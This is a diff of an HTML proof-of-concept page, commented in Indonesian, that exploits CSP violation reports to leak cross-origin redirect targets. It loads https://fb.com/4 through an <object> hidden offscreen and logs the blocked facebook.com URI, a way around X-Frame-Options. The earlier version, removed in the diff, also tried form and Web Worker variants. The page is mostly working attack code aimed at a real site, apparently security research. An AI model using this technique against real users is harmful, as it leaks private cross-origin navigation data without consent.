@@ -4,76 +4,79 @@
     <meta charset="UTF-8">
     <meta http-equiv="Content-Security-Policy" content="
         default-src 'self' 'unsafe-inline'; 
-        form-action https://fb.com; 
-        object-src https://fb.com; 
-        worker-src https://fb.com;
+        object-src https://fb.com;
     ">
-    <title>No-Iframe CSP Leak</title>
+    <title>Object-src CSP Leak (XFO Bypass)</title>
     <style>
         body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
-        button { background: #f00; color: #fff; padding: 10px; border: none; cursor: pointer; font-weight: bold; }
-        .log { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #222; word-break: break-all; }
-        .alert { color: #f00; font-weight: bold; }
+        h2 { color: #ff3333; margin-bottom: 5px; }
+        .info { color: #88ccff; margin-bottom: 20px; }
+        button { background: #ff3333; color: #fff; padding: 12px 24px; border: none; cursor: pointer; font-weight: bold; font-size: 16px; border-radius: 4px; }
+        button:hover { background: #cc0000; }
+        .log-box { border: 1px solid #444; padding: 15px; margin-top: 15px; background: #222; overflow-x: auto; border-radius: 5px; }
+        .alert { color: #ff4444; font-weight: bold; }
+        pre { color: #a6e22e; margin: 10px 0 0 0; }
     </style>
 </head>
 <body>
 
-    <h2>🚫 No-Iframe Leak Tester</h2>
-    <p>Membuktikan kebocoran terjadi tanpa iframe, mem-bypass proteksi X-Frame-Options (XFO).</p>
+    <h2>Object-src CSP Leak (X-Frame-Options Bypass)</h2>
+    <p class="info">
+        Target: <code>https://fb.com/4</code><br>
+        Expected Redirect: <code>https://www.facebook.com/4</code>
+    </p>
     
-    <button id="btnForm">Test 1: Top-Level Form Action</button>
-    <button id="btnObject">Test 2: Object Tag</button>
-    <button id="btnWorker">Test 3: Web Worker</button>
+    
+    <button id="btnExploit">Run Object Exploit</button>
 
     <div id="logs"></div>
 
     <script>
-        const targetUrl = 'https://fb.com/secret-path';
+        const targetUrl = 'https://fb.com/4';
         const logs = document.getElementById('logs');
 
-        // Listener CSP
+        // Listener buat nangkep laporan satpam (CSP)
         document.addEventListener('securitypolicyviolation', e => {
             const isLeaking = e.blockedURI.includes('facebook.com');
-            const status = isLeaking ? '<span class="alert">[ LEAK DETECTED ]</span>' : '[ SAFE ]';
+            const alertText = isLeaking ? '<span class="alert">[ LEAK DETECTED ]</span>' : '[ SAFE ]';
             
-            logs.innerHTML += `
-                <div class="log">
-                    <b>Directive:</b> ${e.violatedDirective}<br>
-                    <b>Status:</b> ${status}<br>
-                    <b class="alert">Blocked URI: ${e.blockedURI}</b>
+            // Ekstrak data krusial buat di-dump
+            const dumpData = {
+                violatedDirective: e.violatedDirective,
+                blockedURI: e.blockedURI,
+                documentURI: e.documentURI,
+                originalPolicy: e.originalPolicy
+            };
+
+            const logBox = document.createElement('div');
+            logBox.className = 'log-box';
+            logBox.innerHTML = `
+                <div style="margin-bottom: 10px; font-size: 1.1em;">
+                    <b>Trigger:</b> <span class="info">&lt;object&gt;</span> | 
+                    <b>Status:</b> ${alertText}
                 </div>
+                <div class="alert" style="font-size: 1.2em;"><b>Leaked URI:</b> ${e.blockedURI}</div>
+                <hr style="border-color: #444; margin: 15px 0;">
+                <div><b>Violation Object Dump:</b></div>
+                <pre>${JSON.stringify(dumpData, null, 2)}</pre>
             `;
-            // Cancel form submission secara visual biar halaman gak pindah beneran kalau tembus
-            e.preventDefault(); 
+            logs.appendChild(logBox);
         });
 
-        // 1. Serangan via Form (Top Level, bukan target iframe)
-        document.getElementById('btnForm').addEventListener('click', () => {
-            const form = document.createElement('form');
-            form.action = targetUrl;
-            form.method = 'GET';
-            // Sengaja GAK PAKE target="..." biar jalan di current window (Top Level)
-            document.body.appendChild(form);
+        // Inject <object> pas tombol diklik
+        document.getElementById('btnExploit').addEventListener('click', () => {
+            logs.innerHTML = ''; // Bersihin log lama
             
-            // Ketika redirect form diblokir CSP, browser nge-abort navigasi, 
-            // jadi halaman kita gak hilang dan tetep bisa nangkep log-nya!
-            form.submit();
-        });
-
-        // 2. Serangan via Object
-        document.getElementById('btnObject').addEventListener('click', () => {
             const obj = document.createElement('object');
             obj.data = targetUrl;
+            
+          
+            obj.style.width = '1px';
+            obj.style.height = '1px';
+            obj.style.position = 'absolute';
+            obj.style.left = '-9999px';
+            
             document.body.appendChild(obj);
-        });
-
-        // 3. Serangan via Worker (Latar Belakang)
-        document.getElementById('btnWorker').addEventListener('click', () => {
-            try {
-                new Worker(targetUrl);
-            } catch(err) {
-                console.log("Worker creation failed/blocked");
-            }
         });
     </script>
 
